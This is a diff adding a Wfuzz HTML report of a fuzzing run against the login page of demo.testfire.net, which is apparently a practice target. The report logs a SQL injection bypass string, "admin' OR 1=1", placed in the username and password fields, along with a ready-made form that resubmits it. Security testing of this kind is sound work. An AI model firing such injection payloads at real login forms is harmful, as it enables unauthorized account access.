@@ -1,0 +1,11 @@
+<html><head></head><body bgcolor=#000000 text=#FFFFFF><h1>Fuzzing http://demo.testfire.net/login.jsp</h1>
+<table border="1">
+<tr><td>#request</td><td>Code</td><td>#lines</td><td>#words</td><td>Url</td></tr>
+
+<tr><td>00001</td>
+<td><font color=#00aa00>200</font></td>
+<td> 194L</td>
+<td>  582W</td>
+<td><table><tr><td>admin' OR 1=1</td><td><form method="post" action="http://demo.testfire.net/login.jsp"><input type="hidden" name="uid" value="admin' OR 1=1"><input type="hidden" name="passw" value="admin' OR 1=1"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+</table></body></html><h5>Wfuzz by EdgeSecurity<h5>
